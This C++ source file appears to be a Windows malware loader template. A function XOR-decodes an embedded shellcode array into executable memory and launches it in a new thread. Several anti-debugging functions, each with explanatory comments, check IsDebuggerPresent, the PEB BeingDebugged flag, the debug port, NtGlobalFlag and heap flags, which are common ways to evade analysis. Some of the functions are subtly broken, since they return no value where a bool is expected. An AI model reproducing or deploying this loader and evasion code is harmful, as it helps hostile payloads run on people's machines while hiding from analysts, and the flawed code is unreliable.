#include "Header.h"


// __readsqword IS AVALIABLE ONLY IN x64 bit

void XorAndInjectShellcode()
{
	BYTE* shellcode_executable = (BYTE*)VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	for (int i = 0; i < sizeof shellcode; i++)
	{
		shellcode_executable[i] = shellcode[i] ^ 0x11;
	}
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_executable, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}

/*
It’s possible to simply “ask” the operating system if any debugger is attached. IsDebuggerPresent function basically checks BeingDebugged flag in the PEB
*/

bool isDebugged_1() {
	if (IsDebuggerPresent()) return;

	// same check
	PPEB pPEB = (PPEB)__readgsqword(0x60);
	if (pPEB->BeingDebugged) return;


	return true; 
}

/*
Another similar function is CheckRemoteDebuggerPresent which calls NtQueryInformationProcess
*/

bool isDebugged_2() {
	BOOL isDebuggerPresent = FALSE;
	CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
	if (isDebuggerPresent) return;

	// same check
	typedef NTSTATUS(WINAPI* PNtQueryInformationProcess)(IN  HANDLE, IN  PROCESSINFOCLASS, OUT PVOID, IN ULONG, OUT PULONG);
	PNtQueryInformationProcess pNtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
	DWORD64 isDebuggerPresent2 = 0;
	pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &isDebuggerPresent2, sizeof DWORD64, NULL);
	if (isDebuggerPresent2) return;

	return true;
}


/*
There are some specific flags set in a process address space when it’s being debugged. NtGlobalFlag is a collection of flags located in the PEB which may indicate a debugger presence.

Note: This did not detect Visual Studio debugger (msvsmon).
*/

bool CheckFlags_1() {
#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
#define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)
	
	PDWORD pNtGlobalFlag = (PDWORD)(__readgsqword(0x60) + 0xBC);
	if ((*pNtGlobalFlag) & NT_GLOBAL_FLAG_DEBUGGED) return false;

	return true;
}

/*
Process heap contains two interesting flags Flags and ForceFlags which are affected by the debugger. When the process is debugged, these flags will have specific values. Heap location as well as flags location (relative to the heap) are system- and architecture-specific.

Note: This did not detect Visual Studio debugger (msvsmon).
*/

bool CheckFlags_2() {
	PDWORD pHeapFlags = (PDWORD)((PBYTE)GetProcessHeap() + 0x70);
	PDWORD pHeapForceFlags = (PDWORD)((PBYTE)GetProcessHeap() + 0x74);
	if (*pHeapFlags ^ HEAP_GROWABLE || *pHeapForceFlags != 0) return false;

	return true;
}

int main()
{
	

	XorAndInjectShellcode();
}